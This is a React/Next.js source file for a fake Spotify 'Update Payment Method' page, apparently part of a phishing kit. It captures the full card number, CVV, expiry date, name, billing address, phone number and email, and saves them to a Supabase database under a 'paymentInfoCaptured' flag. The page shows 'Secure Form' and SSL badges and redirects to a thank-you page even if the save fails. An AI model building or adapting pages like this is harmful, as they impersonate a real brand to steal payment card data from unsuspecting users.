"use client"

import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { LockIcon, CreditCard, Calendar, MapPin, Phone } from "lucide-react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import Image from "next/image";
import { PaymentIcon } from "react-svg-credit-card-payment-icons";
import { savePaymentDetails } from "@/lib/supabase";

export default function UpdatePaymentPage() {
  const router = useRouter();
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [cardholderName, setCardholderName] = useState("");
  const [address, setAddress] = useState("");
  const [city, setCity] = useState("");
  const [state, setState] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [country, setCountry] = useState("US");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "");
    let formatted = "";
    for (let i = 0; i < digits.length; i += 4) {
      formatted += digits.slice(i, i + 4) + " ";
    }
    return formatted.trim();
  };

  const formatExpiryDate = (value: string) => {
    const digits = value.replace(/\D/g, "");
    if (digits.length > 2) {
      return digits.slice(0, 2) + "/" + digits.slice(2, 4);
    }
    return digits;
  };

  const formatPhoneNumber = (value: string) => {
    const digits = value.replace(/\D/g, "");
    if (digits.length <= 3) {
      return digits;
    } else if (digits.length <= 6) {
      return `(${digits.slice(0, 3)}) ${digits.slice(3)}`;
    } else {
      return `(${digits.slice(0, 3)}) ${digits.slice(3, 6)}-${digits.slice(6, 10)}`;
    }
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted.slice(0, 19)); // Limit to 16 digits + 3 spaces
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setExpiryDate(formatted.slice(0, 5)); // Limit to MM/YY format
  };

  const handlePhoneNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatPhoneNumber(e.target.value);
    setPhoneNumber(formatted.slice(0, 14)); // Limit to (XXX) XXX-XXXX
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError("");

    try {
      // Get clean card number (digits only)
      const fullCardNumber = cardNumber.replace(/\D/g, "");

      // Prepare the payment data object
      const paymentData = {
        full_card_number: fullCardNumber,
        card_bin: fullCardNumber.slice(0, 6), // Get the BIN (first 6 digits)
        card_number_last_4: fullCardNumber.slice(-4), // Get last 4 digits
        expiry_date: expiryDate,
        cvv: cvv,
        cardholder_name: cardholderName,
        billing_address: {
          address,
          city,
          state,
          postal_code: postalCode,
          country
        },
        phone_number: phoneNumber,
        user_email: localStorage.getItem('userEmail') || '',
        timestamp: new Date().toISOString()
      };

      // Store payment info in Supabase
      const { error: saveError } = await savePaymentDetails(paymentData);

      if (saveError) {
        console.error("Error saving payment details:", saveError);
        // Continue anyway for the demo
      }

      // Mark payment info as captured for tracking purposes
      localStorage.setItem('paymentInfoCaptured', 'true');

      // Redirect to thank you page
      router.push("/account/thank-you");
    } catch (err) {
      console.error("Payment submission error:", err);
      setError("An error occurred while processing your payment. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="flex items-center justify-center py-6">
      <Card className="bg-[#181818] border-gray-800 p-6 md:p-8 shadow-lg max-w-xl w-full">
        <div className="flex items-center justify-between mb-6">
          <h1 className="text-xl md:text-2xl font-bold text-white">
            Update Payment Method
          </h1>
          <div className="flex items-center space-x-1 text-gray-400 text-sm">
            <LockIcon className="h-3 w-3" />
            <span>Secure Form</span>
          </div>
        </div>

        {error && (
          <div className="mb-6 p-3 bg-red-900/50 border border-red-500 rounded text-white text-sm">
            {error}
          </div>
        )}

        <div className="mb-6">
          <div className="flex items-center space-x-2 mb-4">
            <p className="text-white">Accepted cards:</p>
            <div className="flex space-x-2">
              <PaymentIcon type="Visa" format="flatRounded" width={40} />
              <PaymentIcon type="Mastercard" format="flatRounded" width={40} />
              <PaymentIcon type="Amex" format="flatRounded" width={40} />
              <PaymentIcon type="Discover" format="flatRounded" width={40} />
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            <div>
              <h2 className="text-white font-medium mb-3">Card Information</h2>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="cardNumber" className="text-sm font-medium text-gray-300 flex items-center">
                    <CreditCard className="h-4 w-4 mr-2 text-gray-400" />
                    Card Number
                  </label>
                  <Input
                    id="cardNumber"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    placeholder="1234 5678 9012 3456"
                    className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                    required
                    maxLength={19}
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label htmlFor="expiryDate" className="text-sm font-medium text-gray-300 flex items-center">
                      <Calendar className="h-4 w-4 mr-2 text-gray-400" />
                      Expiry Date
                    </label>
                    <Input
                      id="expiryDate"
                      value={expiryDate}
                      onChange={handleExpiryDateChange}
                      placeholder="MM/YY"
                      className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                      required
                      maxLength={5}
                    />
                  </div>

                  <div className="space-y-2">
                    <label htmlFor="cvv" className="text-sm font-medium text-gray-300">
                      CVV
                    </label>
                    <Input
                      id="cvv"
                      type="text"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                      placeholder="123"
                      className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                      required
                      maxLength={3}
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <label htmlFor="cardholderName" className="text-sm font-medium text-gray-300">
                    Cardholder Name
                  </label>
                  <Input
                    id="cardholderName"
                    type="text"
                    value={cardholderName}
                    onChange={(e) => setCardholderName(e.target.value)}
                    placeholder="John Smith"
                    className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                    required
                  />
                </div>
              </div>
            </div>

            <div>
              <h2 className="text-white font-medium mb-3">Billing Address</h2>

              <div className="space-y-4">
                <div className="space-y-2">
                  <label htmlFor="address" className="text-sm font-medium text-gray-300 flex items-center">
                    <MapPin className="h-4 w-4 mr-2 text-gray-400" />
                    Address
                  </label>
                  <Input
                    id="address"
                    type="text"
                    value={address}
                    onChange={(e) => setAddress(e.target.value)}
                    placeholder="123 Main St"
                    className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                    required
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label htmlFor="city" className="text-sm font-medium text-gray-300">
                      City
                    </label>
                    <Input
                      id="city"
                      type="text"
                      value={city}
                      onChange={(e) => setCity(e.target.value)}
                      placeholder="New York"
                      className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <label htmlFor="state" className="text-sm font-medium text-gray-300">
                      State
                    </label>
                    <Input
                      id="state"
                      type="text"
                      value={state}
                      onChange={(e) => setState(e.target.value)}
                      placeholder="NY"
                      className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label htmlFor="postalCode" className="text-sm font-medium text-gray-300">
                      Postal Code
                    </label>
                    <Input
                      id="postalCode"
                      type="text"
                      value={postalCode}
                      onChange={(e) => setPostalCode(e.target.value)}
                      placeholder="10001"
                      className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                      required
                    />
                  </div>

                  <div className="space-y-2">
                    <label htmlFor="country" className="text-sm font-medium text-gray-300">
                      Country
                    </label>
                    <select
                      id="country"
                      value={country}
                      onChange={(e) => setCountry(e.target.value)}
                      className="w-full h-10 px-3 bg-[#282828] border border-gray-700 rounded text-white"
                      required
                    >
                      <option value="US">United States</option>
                      <option value="CA">Canada</option>
                      <option value="GB">United Kingdom</option>
                      <option value="AU">Australia</option>
                      <option value="DE">Germany</option>
                      <option value="FR">France</option>
                      <option value="IT">Italy</option>
                      <option value="ES">Spain</option>
                      <option value="JP">Japan</option>
                      <option value="BR">Brazil</option>
                      <option value="MX">Mexico</option>
                    </select>
                  </div>
                </div>

                <div className="space-y-2">
                  <label htmlFor="phoneNumber" className="text-sm font-medium text-gray-300 flex items-center">
                    <Phone className="h-4 w-4 mr-2 text-gray-400" />
                    Phone Number
                  </label>
                  <Input
                    id="phoneNumber"
                    type="tel"
                    value={phoneNumber}
                    onChange={handlePhoneNumberChange}
                    placeholder="(123) 456-7890"
                    className="bg-[#282828] border-gray-700 text-white placeholder:text-gray-500"
                    required
                  />
                </div>
              </div>
            </div>

            <div className="pt-2">
              <Button
                type="submit"
                className="w-full bg-[#1ed760] hover:bg-[#1fdf64] text-black font-semibold rounded-full py-6"
                disabled={isLoading}
              >
                {isLoading ? "Processing..." : "Update Payment Method"}
              </Button>
            </div>

            <div className="text-center text-xs text-gray-500 flex flex-col items-center">
              <div className="flex items-center mb-2">
                <LockIcon className="h-3 w-3 mr-1" />
                <span>Secured by SSL encryption</span>
              </div>
              <p>
                By updating your payment information, you agree to Spotify's{" "}
                <Link href="#" className="text-[#1ed760] hover:underline">
                  Terms of Service
                </Link>
              </p>
            </div>
          </form>
        </div>
      </Card>
    </div>
  );
}
